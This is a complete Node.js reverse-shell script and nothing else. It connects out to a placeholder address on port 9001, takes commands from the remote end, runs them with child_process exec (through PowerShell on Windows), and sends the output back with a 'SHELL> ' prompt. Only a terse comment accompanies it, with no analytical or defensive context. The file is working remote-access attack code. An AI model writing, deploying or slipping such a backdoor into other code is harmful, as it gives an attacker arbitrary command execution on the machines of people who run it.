// Windows (Linux/macOS).
const net = require('net');
const { exec } = require('child_process');

function main() {
    const host = 'IP_ADDRESS';
    const port = 9001;

    const client = new net.Socket();

    client.connect(port, host, () => {
        client.write('SHELL> ');
    });

    client.on('data', (data) => {
        const command = data.toString().trim();

        if (command.toLowerCase() === 'exit') {
            client.destroy();
            return;
        }

        const shellCommand = process.platform === 'win32' ? `powershell -Command "${command}"` : command;

        exec(shellCommand, { timeout: 30000 }, (error, stdout, stderr) => {
            let output = stdout + stderr;
            if (error) {
                output += `Error executing command: ${error.message}\n`;
            }
            client.write(output + 'SHELL> ');
        });
    });

    client.on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });

    client.on('close', () => {
        console.log('Connection closed');
    });
}

main();